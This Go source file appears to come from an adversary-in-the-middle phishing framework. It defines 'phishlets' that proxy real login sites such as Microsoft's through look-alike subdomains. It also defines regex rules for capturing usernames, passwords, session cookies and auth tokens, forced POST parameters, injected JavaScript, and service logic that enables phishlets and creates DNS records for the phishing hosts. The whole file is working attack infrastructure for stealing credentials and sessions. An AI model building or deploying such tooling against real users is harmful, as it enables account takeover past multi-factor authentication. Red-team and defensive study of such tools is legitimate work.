package aitm

import (
	"context"
	"errors"
	"fmt"
	"net"
	"regexp"
	"strings"

	"github.com/travisbale/mirage/sdk"
)

var (
	ErrHostnameRequired = errors.New("hostname is required")
	ErrHostnameConflict = errors.New("hostname is already in use by another phishlet")
)

// Phishlet is a compiled phishlet definition. It is the shareable artifact
// produced by parsing and compiling a phishlet YAML file.
type Phishlet struct {
	Name    string
	Author  string
	Version string

	ProxyHosts  []ProxyHost
	SubFilters  []SubFilter
	AuthTokens  []TokenRule
	Credentials CredentialRules
	Login       LoginSpec
	ForcePosts  []ForcePost
	Intercepts  []InterceptRule
	JSInjects   []JSInject
}

// MatchesHost reports whether hostname belongs to this phishlet under baseDomain.
func (p *Phishlet) MatchesHost(hostname, baseDomain string) bool {
	for _, host := range p.ProxyHosts {
		if hostname == host.PhishHost(baseDomain) {
			return true
		}
	}
	return false
}

// FindLanding returns the proxy host marked is_landing, or nil if none.
func (p *Phishlet) FindLanding() *ProxyHost {
	for i := range p.ProxyHosts {
		if p.ProxyHosts[i].IsLanding {
			return &p.ProxyHosts[i]
		}
	}
	return nil
}

// FindProxyHost returns the proxy host whose phishing FQDN matches phishHost,
// stripping any port and normalising case. Returns nil if no host matches.
func (p *Phishlet) FindProxyHost(phishHost, baseDomain string) *ProxyHost {
	host := phishHost
	if h, _, err := net.SplitHostPort(phishHost); err == nil {
		host = h
	}
	lowerHost := strings.ToLower(host)
	for i := range p.ProxyHosts {
		if strings.EqualFold(p.ProxyHosts[i].PhishHost(baseDomain), lowerHost) {
			return &p.ProxyHosts[i]
		}
	}
	return nil
}

// PhishletConfig holds the operator's runtime settings for a phishlet.
// Persisted to SQLite and survives daemon restarts.
type PhishletConfig struct {
	Name        string
	BaseDomain  string
	DNSProvider string
	Hostname    string
	SpoofURL    string
	Enabled     bool
}

// ConfiguredPhishlet pairs a compiled phishlet with operator config.
// This is what the resolver stores and the proxy uses during request handling.
type ConfiguredPhishlet struct {
	Definition *Phishlet
	Config     *PhishletConfig
}

// PhishletFilter controls which configs are returned by ListConfigs.
type PhishletFilter struct {
	Enabled *bool
}

// ProxyHost maps a phishing subdomain to a real upstream host.
type ProxyHost struct {
	PhishSubdomain string
	OrigSubdomain  string
	Domain         string
	IsLanding      bool
	AutoFilter     bool
	UpstreamScheme string // "http" or "https"
}

// PhishHost returns the fully qualified phishing hostname
// (e.g. "login.phish.example.com").
func (h *ProxyHost) PhishHost(baseDomain string) string {
	return h.PhishSubdomain + "." + baseDomain
}

// OriginHost returns the fully qualified upstream hostname
// (e.g. "login.microsoftonline.com").
func (h *ProxyHost) OriginHost() string {
	if h.OrigSubdomain != "" {
		return h.OrigSubdomain + "." + h.Domain
	}
	return h.Domain
}

// SubFilter is a compiled search/replace rule applied to proxied response bodies.
type SubFilter struct {
	Hostname  string
	MimeTypes []string
	Search    *regexp.Regexp
	Replace   string
}

func (s *SubFilter) MatchesMIME(mimeType string) bool {
	for _, mime := range s.MimeTypes {
		if strings.HasPrefix(mimeType, mime) {
			return true
		}
	}
	return false
}

// TokenType classifies how an auth token is extracted.
type TokenType int

const (
	TokenTypeCookie TokenType = iota
	TokenTypeBody
	TokenTypeHTTPHeader
)

// TokenRule describes how to capture one auth token from a response.
type TokenRule struct {
	Type     TokenType
	Domain   string
	Name     *regexp.Regexp
	Search   *regexp.Regexp
	HTTPOnly bool
	Always   bool
}

// CredentialRules groups the extraction rules for username, password, and custom fields.
type CredentialRules struct {
	Username CredentialRule
	Password CredentialRule
	Custom   []CustomCredentialRule
}

// CredentialRule is a key+search regex pair that extracts one field from POST/JSON.
type CredentialRule struct {
	Key    *regexp.Regexp
	Search *regexp.Regexp
	Type   string // "post" or "json"
}

// CustomCredentialRule is like CredentialRule but stores into Session.Custom[Name].
type CustomCredentialRule struct {
	Name string
	CredentialRule
}

// LoginSpec identifies where the login form lives.
type LoginSpec struct {
	Domain string
	Path   string
}

// ForcePost describes a POST parameter to inject or override.
type ForcePost struct {
	Path       *regexp.Regexp
	Conditions []ForcePostCondition
	Params     []ForcePostParam
}

type ForcePostCondition struct {
	Key    *regexp.Regexp
	Search *regexp.Regexp
}

type ForcePostParam struct {
	Key   string
	Value string
}

// InterceptRule matches a request and returns a fully custom response.
type InterceptRule struct {
	Path        *regexp.Regexp
	BodySearch  *regexp.Regexp
	StatusCode  int
	ContentType string
	Body        string
}

// JSInject defines a JavaScript snippet to inject into matching pages.
type JSInject struct {
	TriggerDomain string
	TriggerPath   *regexp.Regexp
	Script        string
}

type phishletStore interface {
	SavePhishlet(name string, yaml string) error
	GetPhishlet(name string) (string, error)
	ListPhishlets() ([]string, error)
	SetConfig(p *PhishletConfig) error
	GetConfig(name string) (*PhishletConfig, error)
	ListConfigs(filter PhishletFilter) ([]*PhishletConfig, error)
	DeletePhishlet(name string) error
}

type phishletResolver interface {
	Get(name string) *ConfiguredPhishlet
	Register(cp *ConfiguredPhishlet)
	OwnerOf(hostname string) string
	ResolveHostname(hostname, urlPath string) (*ConfiguredPhishlet, *Lure, error)
	LoadLuresFromDB() error
	InvalidateLures()
}

type phishletCompiler interface {
	Compile(yaml string) (*Phishlet, error)
}

type dnsReconciler interface {
	Reconcile(ctx context.Context, records []PhishletRecord) error
	RemoveRecords(ctx context.Context, records []PhishletRecord) error
}

// PhishletService owns all business logic for phishlet lifecycle.
// Every enable/disable writes to the store AND updates the in-memory resolver,
// so the proxy router never falls out of sync with the database.
type PhishletService struct {
	Store    phishletStore
	Bus      eventBus
	DNS      dnsReconciler
	Resolver phishletResolver
	Compiler phishletCompiler
}

// LoadFromDB compiles stored definitions, applies operator config, and
// registers enabled phishlets in the resolver. Call once at startup.
func (s *PhishletService) LoadFromDB() error {
	enabled := true
	configs, err := s.Store.ListConfigs(PhishletFilter{Enabled: &enabled})
	if err != nil {
		return fmt.Errorf("loading phishlets: %w", err)
	}

	for _, cfg := range configs {
		yaml, err := s.Store.GetPhishlet(cfg.Name)
		if err != nil || yaml == "" {
			continue
		}
		def, err := s.Compiler.Compile(yaml)
		if err != nil {
			continue
		}
		s.Resolver.Register(&ConfiguredPhishlet{Definition: def, Config: cfg})
	}

	return s.Resolver.LoadLuresFromDB()
}

// Push validates phishlet YAML and stores the definition.
func (s *PhishletService) Push(yaml string) (*Phishlet, error) {
	def, err := s.Compiler.Compile(yaml)
	if err != nil {
		return nil, err
	}
	if err := s.Store.SavePhishlet(def.Name, yaml); err != nil {
		return nil, err
	}
	s.Bus.Publish(Event{Type: sdk.EventPhishletPushed, Payload: def})
	return def, nil
}

// ResolveHostname returns the configured phishlet and best-matching lure for a
// request hostname. Returns nil, nil, nil when no active phishlet owns the hostname.
func (s *PhishletService) ResolveHostname(hostname, urlPath string) (*ConfiguredPhishlet, *Lure, error) {
	return s.Resolver.ResolveHostname(hostname, urlPath)
}

// InvalidateLures reloads the lure cache after any lure mutation.
// Satisfies the lureInvalidator interface so LureService can notify the routing index.
func (s *PhishletService) InvalidateLures() {
	s.Resolver.InvalidateLures()
}

// Enable marks a phishlet as active, optionally updating its hostname, base
// domain, and DNS provider. The resolver is updated so routing takes effect
// immediately. If a DNS reconciler is configured, A records are created for
// each proxy host's phishing FQDN.
func (s *PhishletService) Enable(ctx context.Context, name, hostname, dnsProvider string) (*ConfiguredPhishlet, error) {
	yaml, err := s.Store.GetPhishlet(name)
	if err != nil {
		return nil, err
	}
	def, err := s.Compiler.Compile(yaml)
	if err != nil {
		return nil, err
	}

	// Start from existing config or create a new one.
	cfg, err := s.Store.GetConfig(name)
	if err != nil {
		cfg = &PhishletConfig{Name: name}
	}

	if hostname != "" {
		cfg.Hostname = hostname
	}
	if dnsProvider != "" {
		cfg.DNSProvider = dnsProvider
	}
	if cfg.Hostname == "" {
		return nil, ErrHostnameRequired
	}
	if cfg.BaseDomain == "" {
		cfg.BaseDomain = deriveBaseDomain(def, cfg.Hostname)
	}
	if owner := s.Resolver.OwnerOf(cfg.Hostname); owner != "" && owner != cfg.Name {
		return nil, ErrHostnameConflict
	}
	cfg.Enabled = true

	if err := s.Store.SetConfig(cfg); err != nil {
		return nil, err
	}
	cp := &ConfiguredPhishlet{Definition: def, Config: cfg}
	if err := s.DNS.Reconcile(ctx, phishletRecords(cp)); err != nil {
		return nil, fmt.Errorf("dns reconcile: %w", err)
	}
	s.Resolver.Register(cp)
	s.Bus.Publish(Event{Type: sdk.EventPhishletEnabled, Payload: cp})
	return cp, nil
}

// Disable marks a phishlet as inactive and removes its DNS records.
func (s *PhishletService) Disable(ctx context.Context, name string) (*ConfiguredPhishlet, error) {
	cp := s.Resolver.Get(name)
	if cp == nil {
		return nil, ErrNotFound
	}
	if cp.Config.Enabled {
		if err := s.DNS.RemoveRecords(ctx, phishletRecords(cp)); err != nil {
			return nil, fmt.Errorf("dns cleanup: %w", err)
		}
	}
	cp.Config.Enabled = false
	if err := s.Store.SetConfig(cp.Config); err != nil {
		return nil, err
	}
	s.Resolver.Register(cp)
	return cp, nil
}

// Get returns the phishlet config by name.
func (s *PhishletService) Get(name string) (*PhishletConfig, error) {
	return s.Store.GetConfig(name)
}

// List returns all phishlet configs.
func (s *PhishletService) List() ([]*PhishletConfig, error) {
	return s.Store.ListConfigs(PhishletFilter{})
}

// ReconcileAll reconciles DNS records for all enabled phishlets.
func (s *PhishletService) ReconcileAll(ctx context.Context) error {
	enabled := true
	configs, err := s.Store.ListConfigs(PhishletFilter{Enabled: &enabled})
	if err != nil {
		return fmt.Errorf("listing enabled phishlets: %w", err)
	}

	var records []PhishletRecord
	for _, cfg := range configs {
		cp := s.Resolver.Get(cfg.Name)
		if cp == nil {
			continue
		}
		records = append(records, phishletRecords(cp)...)
	}

	return s.DNS.Reconcile(ctx, records)
}

// deriveBaseDomain infers the base domain from the phishing hostname by matching
// each proxy host's PhishSubdomain as a prefix. Returns "" if no match is found.
func deriveBaseDomain(def *Phishlet, hostname string) string {
	if def == nil {
		return ""
	}
	hostname = strings.ToLower(hostname)
	for _, proxyHost := range def.ProxyHosts {
		prefix := strings.ToLower(proxyHost.PhishSubdomain) + "."
		if strings.HasPrefix(hostname, prefix) {
			return hostname[len(prefix):]
		}
	}
	return ""
}

// phishletRecords builds the DNS A records needed for a phishlet's proxy hosts.
// Each proxy host's phishing FQDN needs an A record in the base domain zone.
func phishletRecords(cp *ConfiguredPhishlet) []PhishletRecord {
	records := make([]PhishletRecord, 0, len(cp.Definition.ProxyHosts))
	for _, ph := range cp.Definition.ProxyHosts {
		records = append(records, PhishletRecord{
			Zone: cp.Config.BaseDomain,
			Name: ph.PhishHost(cp.Config.BaseDomain),
		})
	}
	return records
}
